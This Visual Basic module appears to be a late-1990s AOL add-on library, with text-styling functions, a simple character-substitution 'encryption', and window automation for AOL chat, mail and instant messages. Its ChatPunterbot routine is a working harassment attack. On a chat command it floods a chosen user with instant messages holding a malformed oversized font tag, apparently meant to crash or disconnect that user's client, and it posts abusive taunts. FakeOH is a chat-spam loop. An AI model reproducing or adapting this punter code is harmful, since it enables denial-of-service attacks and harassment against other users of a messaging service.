If nextchr$ = "N" Then Let nextchr$ = "/\/"
If nextchr$ = "n" Then Let nextchr$ = "ñ"
If nextchr$ = "O" Then Let nextchr$ = "Ø"
If nextchr$ = "o" Then Let nextchr$ = "ö"
If nextchr$ = "P" Then Let nextchr$ = "¶"
If nextchr$ = "p" Then Let nextchr$ = "Þ"
If nextchr$ = "r" Then Let nextchr$ = "®"
If nextchr$ = "S" Then Let nextchr$ = "§"
If nextchr$ = "s" Then Let nextchr$ = "$"
If nextchr$ = "t" Then Let nextchr$ = "†"
If nextchr$ = "U" Then Let nextchr$ = "Ú"
If nextchr$ = "u" Then Let nextchr$ = "µ"
If nextchr$ = "V" Then Let nextchr$ = "\/"
If nextchr$ = "W" Then Let nextchr$ = "VV"
If nextchr$ = "w" Then Let nextchr$ = "vv"
If nextchr$ = "X" Then Let nextchr$ = "X"
If nextchr$ = "x" Then Let nextchr$ = "×"
If nextchr$ = "Y" Then Let nextchr$ = "¥"
If nextchr$ = "y" Then Let nextchr$ = "ý"
If nextchr$ = "!" Then Let nextchr$ = "¡"
If nextchr$ = "?" Then Let nextchr$ = "¿"
If nextchr$ = "." Then Let nextchr$ = "…"
If nextchr$ = "," Then Let nextchr$ = "‚"
If nextchr$ = "1" Then Let nextchr$ = "¹"
If nextchr$ = "%" Then Let nextchr$ = "‰"
If nextchr$ = "2" Then Let nextchr$ = "²"
If nextchr$ = "3" Then Let nextchr$ = "³"
If nextchr$ = "_" Then Let nextchr$ = "¯"
If nextchr$ = "-" Then Let nextchr$ = "—"
If nextchr$ = " " Then Let nextchr$ = " "
If nextchr$ = "<" Then Let nextchr$ = "«"
If nextchr$ = ">" Then Let nextchr$ = "»"
If nextchr$ = "*" Then Let nextchr$ = "¤"
If nextchr$ = "`" Then Let nextchr$ = "“"
If nextchr$ = "'" Then Let nextchr$ = "”"
If nextchr$ = "0" Then Let nextchr$ = "º"
Let newsent$ = newsent$ + nextchr$

Greed:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop

BoldBlackBlueBlack (newsent$)

End Function

Function r_elite(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If crapp% > 0 Then GoTo Greed

If nextchr$ = "A" Then Let nextchr$ = "/\"
If nextchr$ = "a" Then Let nextchr$ = "å"
If nextchr$ = "B" Then Let nextchr$ = "ß"
If nextchr$ = "C" Then Let nextchr$ = "Ç"
If nextchr$ = "c" Then Let nextchr$ = "¢"
If nextchr$ = "D" Then Let nextchr$ = "Ð"
If nextchr$ = "d" Then Let nextchr$ = "ð"
If nextchr$ = "E" Then Let nextchr$ = "Ê"
If nextchr$ = "e" Then Let nextchr$ = "è"
If nextchr$ = "f" Then Let nextchr$ = "ƒ"
If nextchr$ = "H" Then Let nextchr$ = "|-|"
If nextchr$ = "I" Then Let nextchr$ = "‡"
If nextchr$ = "i" Then Let nextchr$ = "î"
If nextchr$ = "k" Then Let nextchr$ = "|‹"
If nextchr$ = "L" Then Let nextchr$ = "£"
If nextchr$ = "M" Then Let nextchr$ = "]V["
If nextchr$ = "m" Then Let nextchr$ = "^^"
If nextchr$ = "N" Then Let nextchr$ = "/\/"
If nextchr$ = "n" Then Let nextchr$ = "ñ"
If nextchr$ = "O" Then Let nextchr$ = "Ø"
If nextchr$ = "o" Then Let nextchr$ = "ö"
If nextchr$ = "P" Then Let nextchr$ = "¶"
If nextchr$ = "p" Then Let nextchr$ = "Þ"
If nextchr$ = "r" Then Let nextchr$ = "®"
If nextchr$ = "S" Then Let nextchr$ = "§"
If nextchr$ = "s" Then Let nextchr$ = "$"
If nextchr$ = "t" Then Let nextchr$ = "†"
If nextchr$ = "U" Then Let nextchr$ = "Ú"
If nextchr$ = "u" Then Let nextchr$ = "µ"
If nextchr$ = "V" Then Let nextchr$ = "\/"
If nextchr$ = "W" Then Let nextchr$ = "VV"
If nextchr$ = "w" Then Let nextchr$ = "vv"
If nextchr$ = "X" Then Let nextchr$ = "X"
If nextchr$ = "x" Then Let nextchr$ = "×"
If nextchr$ = "Y" Then Let nextchr$ = "¥"
If nextchr$ = "y" Then Let nextchr$ = "ý"
If nextchr$ = "!" Then Let nextchr$ = "¡"
If nextchr$ = "?" Then Let nextchr$ = "¿"
If nextchr$ = "." Then Let nextchr$ = "…"
If nextchr$ = "," Then Let nextchr$ = "‚"
If nextchr$ = "1" Then Let nextchr$ = "¹"
If nextchr$ = "%" Then Let nextchr$ = "‰"
If nextchr$ = "2" Then Let nextchr$ = "²"
If nextchr$ = "3" Then Let nextchr$ = "³"
If nextchr$ = "_" Then Let nextchr$ = "¯"
If nextchr$ = "-" Then Let nextchr$ = "—"
If nextchr$ = " " Then Let nextchr$ = " "
If nextchr$ = "<" Then Let nextchr$ = "«"
If nextchr$ = ">" Then Let nextchr$ = "»"
If nextchr$ = "*" Then Let nextchr$ = "¤"
If nextchr$ = "`" Then Let nextchr$ = "“"
If nextchr$ = "'" Then Let nextchr$ = "”"
If nextchr$ = "0" Then Let nextchr$ = "º"
Let newsent$ = newsent$ + nextchr$

Greed:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop

r_elite = (newsent$)

End Function
Function r_hacker(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
If nextchr$ = "A" Then Let nextchr$ = "a"
If nextchr$ = "E" Then Let nextchr$ = "e"
If nextchr$ = "I" Then Let nextchr$ = "i"
If nextchr$ = "O" Then Let nextchr$ = "o"
If nextchr$ = "U" Then Let nextchr$ = "u"
If nextchr$ = "b" Then Let nextchr$ = "B"
If nextchr$ = "c" Then Let nextchr$ = "C"
If nextchr$ = "d" Then Let nextchr$ = "D"
If nextchr$ = "z" Then Let nextchr$ = "Z"
If nextchr$ = "f" Then Let nextchr$ = "F"
If nextchr$ = "g" Then Let nextchr$ = "G"
If nextchr$ = "h" Then Let nextchr$ = "H"
If nextchr$ = "y" Then Let nextchr$ = "Y"
If nextchr$ = "j" Then Let nextchr$ = "J"
If nextchr$ = "k" Then Let nextchr$ = "K"
If nextchr$ = "l" Then Let nextchr$ = "L"
If nextchr$ = "m" Then Let nextchr$ = "M"
If nextchr$ = "n" Then Let nextchr$ = "N"
If nextchr$ = "x" Then Let nextchr$ = "X"
If nextchr$ = "p" Then Let nextchr$ = "P"
If nextchr$ = "q" Then Let nextchr$ = "Q"
If nextchr$ = "r" Then Let nextchr$ = "R"
If nextchr$ = "s" Then Let nextchr$ = "S"
If nextchr$ = "t" Then Let nextchr$ = "T"
If nextchr$ = "w" Then Let nextchr$ = "W"
If nextchr$ = "v" Then Let nextchr$ = "V"
If nextchr$ = " " Then Let nextchr$ = " "
Let newsent$ = newsent$ + nextchr$
Loop
BoldBlackBlueBlack (newsent$)


End Function
Function R_Hacker2(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
If nextchr$ = "A" Then Let nextchr$ = "a"
If nextchr$ = "E" Then Let nextchr$ = "e"
If nextchr$ = "I" Then Let nextchr$ = "i"
If nextchr$ = "O" Then Let nextchr$ = "o"
If nextchr$ = "U" Then Let nextchr$ = "u"
If nextchr$ = "b" Then Let nextchr$ = "B"
If nextchr$ = "c" Then Let nextchr$ = "C"
If nextchr$ = "d" Then Let nextchr$ = "D"
If nextchr$ = "z" Then Let nextchr$ = "Z"
If nextchr$ = "f" Then Let nextchr$ = "F"
If nextchr$ = "g" Then Let nextchr$ = "G"
If nextchr$ = "h" Then Let nextchr$ = "H"
If nextchr$ = "y" Then Let nextchr$ = "Y"
If nextchr$ = "j" Then Let nextchr$ = "J"
If nextchr$ = "k" Then Let nextchr$ = "K"
If nextchr$ = "l" Then Let nextchr$ = "L"
If nextchr$ = "m" Then Let nextchr$ = "M"
If nextchr$ = "n" Then Let nextchr$ = "N"
If nextchr$ = "x" Then Let nextchr$ = "X"
If nextchr$ = "p" Then Let nextchr$ = "P"
If nextchr$ = "q" Then Let nextchr$ = "Q"
If nextchr$ = "r" Then Let nextchr$ = "R"
If nextchr$ = "s" Then Let nextchr$ = "S"
If nextchr$ = "t" Then Let nextchr$ = "T"
If nextchr$ = "w" Then Let nextchr$ = "W"
If nextchr$ = "v" Then Let nextchr$ = "V"
If nextchr$ = " " Then Let nextchr$ = " "
Let newsent$ = newsent$ + nextchr$
Loop
BoldBlackBlueBlack2 (newsent$)


End Function
Function R_Spaced2(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + " "
Let newsent$ = newsent$ + nextchr$
Loop
 RedBlackRed2 (newsent$)

End Function

Function r_spaced(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + " "
Let newsent$ = newsent$ + nextchr$
Loop
 BoldRedBlackRed (newsent$)

End Function
Function findchildbytitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
findchildbytitle = 0

bone:
room% = firs%
findchildbytitle = room%
End Function

Function GetClass(child)
buffer$ = String$(250, 0)
getclas% = GetClassName(child, buffer$, 250)

GetClass = buffer$
End Function

Function FindChatRoom()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
room% = Findchildbyclass(mdi%, "AOL Child")
stuff% = Findchildbyclass(room%, "_AOL_Listbox")
MoreStuff% = Findchildbyclass(room%, "RICHCNTL")
If stuff% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = room%
Else:
   FindChatRoom = 0
End If
End Function
Function UserSN()
On Error Resume Next
aol% = FindWindow("AOL Frame25", "America  Online")
mdi% = Findchildbyclass(aol%, "MDIClient")
welcome% = findchildbytitle(mdi%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
a% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
user = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
UserSN = user
End Function

Sub KillWait()

aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = Findchildbyclass(aol%, "AOL Toolbar")
AOTool2% = Findchildbyclass(AOTooL%, "_AOL_Toolbar")

AOIcon% = Findchildbyclass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

Call Timeout(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
mdi% = Findchildbyclass(aol%, "MDIClient")
KeyWordWin% = findchildbytitle(mdi%, "Keyword")
AOEdit% = Findchildbyclass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = Findchildbyclass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessage(KeyWordWin%, WM_CLOSE, 0, 0)
End Sub
Public Function Encrypt(word$)
'written by  Soap Shoe
'Thanxz
word$ = LCase(word$)
Made$ = ""
For q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, q, 1)
    Leet$ = ""
If letter$ = "a" Then Leet$ = "$"
If letter$ = "b" Then Leet$ = "^"
If letter$ = "c" Then Leet$ = "&"
If letter$ = "d" Then Leet$ = "*"
If letter$ = "e" Then Leet$ = "("
If letter$ = "f" Then Leet$ = ")"
If letter$ = "g" Then Leet$ = "_"
If letter$ = "h" Then Leet$ = "%"
If letter$ = "i" Then Leet$ = "+"
If letter$ = "j" Then Leet$ = "="
If letter$ = "k" Then Leet$ = "-"
If letter$ = "l" Then Leet$ = "|"
If letter$ = "m" Then Leet$ = "\"
If letter$ = "n" Then Leet$ = "]"
If letter$ = "o" Then Leet$ = "["
If letter$ = "p" Then Leet$ = "}"
If letter$ = "q" Then Leet$ = "{"
If letter$ = "r" Then Leet$ = "'"
If letter$ = "s" Then Leet$ = ":"
If letter$ = "t" Then Leet$ = ";"
If letter$ = "u" Then Leet$ = "/"
If letter$ = "v" Then Leet$ = "?"
If letter$ = "w" Then Leet$ = "."
If letter$ = "x" Then Leet$ = ">"
If letter$ = "y" Then Leet$ = ","
If letter$ = "z" Then Leet$ = "<"
            
If Len(Leet$) = 0 Then Leet$ = letter$
Made$ = Made$ & Leet$
Next q

SendChat "<font face=""Arial""></b>Il|lI" + Made$
End Function

Public Function UnEncrypt(word$)
'written by  Soap Shoe
'Thanxz
Made$ = ""
For q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, q, 1)
    Leet$ = ""
If letter$ = "$" Then Leet$ = "a"
If letter$ = "^" Then Leet$ = "b"
If letter$ = "&" Then Leet$ = "c"
If letter$ = "*" Then Leet$ = "d"
If letter$ = "(" Then Leet$ = "e"
If letter$ = ")" Then Leet$ = "f"
If letter$ = "_" Then Leet$ = "g"
If letter$ = "%" Then Leet$ = "h"
If letter$ = "+" Then Leet$ = "i"
If letter$ = "=" Then Leet$ = "j"
If letter$ = "-" Then Leet$ = "k"
If letter$ = "|" Then Leet$ = "l"
If letter$ = "\" Then Leet$ = "m"
If letter$ = "]" Then Leet$ = "n"
If letter$ = "[" Then Leet$ = "o"
If letter$ = "}" Then Leet$ = "p"
If letter$ = "{" Then Leet$ = "q"
If letter$ = "'" Then Leet$ = "r"
If letter$ = ":" Then Leet$ = "s"
If letter$ = ";" Then Leet$ = "t"
If letter$ = "/" Then Leet$ = "u"
If letter$ = "?" Then Leet$ = "v"
If letter$ = "." Then Leet$ = "w"
If letter$ = ">" Then Leet$ = "x"
If letter$ = "," Then Leet$ = "y"
If letter$ = "<" Then Leet$ = "z"
            
If Len(Leet$) = 0 Then Leet$ = letter$
Made$ = Made$ & Leet$
Next q

UnEncrypt = Made$
End Function

Function IsUserOnline2(Lbl As Label)
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
welcome% = findchildbytitle(mdi%, "Welcome,")
If welcome% <> 0 Then
   IsUserOnline2 = 1
   Lbl.Caption = "Online"
Else:
   IsUserOnline2 = 0
   Lbl.Caption = "Offline"
End If
End Function
Function IsUserOnline(Lbl As Label)
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
welcome% = findchildbytitle(mdi%, "Welcome,")
If welcome% <> 0 Then
   IsUserOnline = 1
   Else:
   IsUserOnline = 0
   End If
End Function
Function GetCaption(hwnd)
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
a% = GetWindowText(hwnd, hwndTitle$, (hwndLength% + 1))

GetCaption = hwndTitle$
End Function

Sub SendChat(chat)
room% = FindChatRoom
AORich% = Findchildbyclass(room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, "</B>" & chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub sendchat2(chat)
room% = FindChatRoom
AORich% = Findchildbyclass(room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, chat)
End Sub
Sub Timeout(duration)
starttime = Timer
Do While Timer - starttime < duration
DoEvents
Loop

End Sub

Sub StayonTop(TheForm As Form)
'alot of peeps been sayin this
'don't werk with vb4.. somone told me
'for VB 4 use the code of
'Call stayontop (TheForm)
'in a timer set at interval of 1
SetWinOnTop = SetWindowPos(TheForm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Sub
Sub ChatPunterbot(SN1 As TextBox, Bombs As TextBox)
'This will see if somebody types /Punt: in a chat
'room...then punt the SN they put.
On Error GoTo ErrHandler
GINA69 = AOLGetUser
GINA69 = UCase(GINA69)

heh$ = LastChatLine
heh$ = UCase(heh$)
naw$ = Mid(heh$, InStr(heh$, ":") + 2)
Timeout (0.3)
sn = Mid(naw$, InStr(naw$, ":") + 1)
sn = UCase(sn)
Timeout (0.3)
pntstr = Mid$(naw$, 1, (InStr(naw$, ":") - 1))
GINA = pntstr
If GINA = "/PUNT" Then
SN1 = sn
If SN1 = GINA69 Or SN1 = " " + GINA69 Or SN1 = "  " + GINA69 Or SN1 = "   " + GINA69 Or SN1 = "     " + GINA69 Or SN1 = "      " + GINA69 Then
SN1 = AOLGetSNfromCHAT
    BoldPurpleRed "· ···•(\›•    Room Punter"
    BoldPurpleRed "· ···•(\›•    I can't punt myself BITCH!"
    BoldPurpleRed "· ···•(\›•    Now U Get PUNTED!"
    GoTo JAKC
    Timeout (1)
Exit Sub
End If
    GoTo SendITT
Else
    Exit Sub
End If
SendITT:
BoldPurpleRed "· ···•(\›•    Room punt"
BoldPurpleRed "· ···•(\›•    Request Noted"
BoldPurpleRed "· ···•(\›•    Now †h®åShîng - " + SN1
BoldPurpleRed "· ···•(\›•    Punting With - " + Bombs + " IMz"
JAKC:
Call IMsOff
Do
Call IMKeyword(SN1, "</P><P ALIGN=CENTER><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>")
Bombs = Str(Val(Bombs - 1))
If FindWindow("#32770", "Aol canada") <> 0 Then Exit Sub: MsgBox "This User is not currently signed on, or his/her IMz are Off."
Loop Until Bombs <= 0
Call IMsOn
Bombs = "10"
ErrHandler:
    Exit Sub
End Sub
Public Sub Macrothing(Txt As TextBox)
'This scrolls a multilined textbox adding timeouts where needed
'This is basically for macro shops and things like that.
BoldPurpleRed "· ···•(\›• INCOMMING TEXT"
Timeout 4
Dim onelinetxt$, X$, start%, i%
start% = 1
fa = 1
For i% = start% To Len(Txt.Text)
X$ = Mid(Txt.Text, i%, 1)
onelinetxt$ = onelinetxt$ + X$
If Asc(X$) = 13 Then
BoldPurpleRed ": " + onelinetxt$
Timeout (0.5)
j% = j% + 1
i% = InStr(start%, Txt.Text, X$)
If i% >= Len(Txt.Text) Then Exit For
start% = i% + 1
onelinetxt$ = ""
End If
Next i%
BoldSendChat ":" + onelinetxt$
End Sub
Sub Anti45MinTimer()
'use this sub in a timer set at 100
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AOIcon% = Findchildbyclass(AOTimer%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub AntiIdle()
'use this sub in a timer set at 100
AOModal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = Findchildbyclass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub ClickIcon(icon%)
c% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
c% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub SendMail(Recipiants, Subject, message)

aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = Findchildbyclass(aol%, "AOL Toolbar")
AOTool2% = Findchildbyclass(AOTooL%, "_AOL_Toolbar")
AOIcon% = Findchildbyclass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)

ClickIcon (AOIcon%)

Do: DoEvents
mdi% = Findchildbyclass(aol%, "MDIClient")
AOMail% = findchildbytitle(mdi%, "Write Mail")
AOEdit% = Findchildbyclass(AOMail%, "_AOL_Edit")
AORich% = Findchildbyclass(AOMail%, "RICHCNTL")
AOIcon% = Findchildbyclass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Subject)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For GetIcon = 1 To 18
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

ClickIcon (AOIcon%)

Do: DoEvents
AOError% = findchildbytitle(mdi%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AOIcon% = Findchildbyclass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub
Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
End Function

Sub KeyWord(TheKeyWord As String)
aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = Findchildbyclass(aol%, "AOL Toolbar")
AOTool2% = Findchildbyclass(AOTooL%, "_AOL_Toolbar")

AOIcon% = Findchildbyclass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 20
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

' ******************************

Call Timeout(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
mdi% = Findchildbyclass(aol%, "MDIClient")
KeyWordWin% = findchildbytitle(mdi%, "Keyword")
AOEdit% = Findchildbyclass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = Findchildbyclass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, TheKeyWord)

Call Timeout(0.05)
ClickIcon (AOIcon2%)
ClickIcon (AOIcon2%)

End Sub

Function BoldAOL4_WavColors(Text1 As String)
G$ = Text1
a = Len(G$)
For w = 1 To a Step 4
    R$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    T$ = Mid$(G$, w + 3, 1)
    P$ = P$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & T$
Next w
SendChat (P$)
End Function
Function AOL4_WavColors3(Text1 As String)

End Function
Sub IMBuddy(Recipiant, message)

aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
buddy% = findchildbytitle(mdi%, "Buddy List Window")

If buddy% = 0 Then
    KeyWord ("BuddyView")
    Do: DoEvents
    Loop Until buddy% <> 0
End If

AOIcon% = Findchildbyclass(buddy%, "_AOL_Icon")

For l = 1 To 2
    AOIcon% = GetWindow(AOIcon%, 2)
Next l

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
IMWin% = findchildbytitle(mdi%, "Send Instant Message")
AOEdit% = Findchildbyclass(IMWin%, "_AOL_Edit")
AORich% = Findchildbyclass(IMWin%, "RICHCNTL")
AOIcon% = Findchildbyclass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
IMWin% = findchildbytitle(mdi%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub
Sub IMKeyword(Recipiant, message)

aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")

Call KeyWord("aol://9293:")

Do: DoEvents
IMWin% = findchildbytitle(mdi%, "Send Instant Message")
AOEdit% = Findchildbyclass(IMWin%, "_AOL_Edit")
AORich% = Findchildbyclass(IMWin%, "RICHCNTL")
AOIcon% = Findchildbyclass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
IMWin% = findchildbytitle(mdi%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub
Function AddMailToList(Which As Integer, List As ListBox)

AoL40& = FindWindow("AOL Frame25", vbNullString)
mdi& = AOLMDI
TB& = Findchildbyclass(AoL40&, "AOL Toolbar")
Toolz& = Findchildbyclass(TB&, "_AOL_Toolbar")
AoLRead& = Findchildbyclass(Toolz&, "_AOL_Icon")
ClickIcon (AoLRead&)
Timeout 0.1
u$ = GetUser
Do:
DoEvents
MailPar& = findchildbytitle(mdi&, u$ + "'s Online Mailbox")
TabControl& = Findchildbyclass(MailPar&, "_AOL_TabControl")
TabPage& = Findchildbyclass(TabControl&, "_AOL_TabPage")
If Which = 2 Then TabPage& = GetWindow(TabPage&, GW_HWNDNEXT)
If Which = 3 Then TabPage& = GetWindow(TabPage&, GW_HWNDNEXT): TabPage& = GetWindow(TabPage&, GW_HWNDNEXT)
Tree& = Findchildbyclass(TabPage&, "_AOL_Tree")
If MailPar& <> 0 And TabControl& <> 0 And TabPage& <> 0 And Tree& <> 0 Then Exit Do
Loop

sBuffer& = SendMessage(Tree&, &H18B, 0, 0)

For MailNum = 0 To sBuffer
TxtLen& = SendMessageByNum(Tree&, &H18A, MailNum, 0&)
Txt$ = String(TxtLen& + 1, 0&)
GTTXT& = SendMessageByString(Tree&, &H189, MailNum, Txt$)
NewMail = RTrim(Txt$)
List.AddItem (NewMail)
Next MailNum

End Function

Sub HideWelcome()
Welc& = findchildbytitle(AOLMDI, "Welcome,")
ret& = ShowWindow(Welc&, 0)
ret& = SetFocusAPI(aol&)
End Sub


Sub FakeOH(txt1 As TextBox)
Shit = String(116, Chr(32))
d = 116 - Len("Tko4.0")
c$ = Left(Shit, d)
Do
Call SendChat(txt1 & c$ & "         ")
Timeout 0.6
Call SendChat(txt1 & c$ & "         ")
Timeout 0.3
Call SendChat(txt1 & c$ & "         ")
Timeout 0.6
Call SendChat(txt1 & c$ & "         ")
Timeout 0.6
Call SendChat(txt1 & c$ & "         ")
Timeout 0.3
Call SendChat(txt1 & c$ & "         ")
Timeout 0.6
Loop
End Sub
Function CountMail()
AoL40& = FindWindow("AOL Frame25", vbNullString)
mdi& = AOLMDI
TB& = Findchildbyclass(AoL40&, "AOL Toolbar")
Toolz& = Findchildbyclass(TB&, "_AOL_Toolbar")
AoLRead& = Findchildbyclass(Toolz&, "_AOL_Icon")
ClickIcon (AoLRead&)
Timeout 0.1
u$ = GetUser
Do:
DoEvents
MailPar& = findchildbytitle(mdi&, u$ + "'s Online Mailbox")
TabControl& = Findchildbyclass(MailPar&, "_AOL_TabControl")
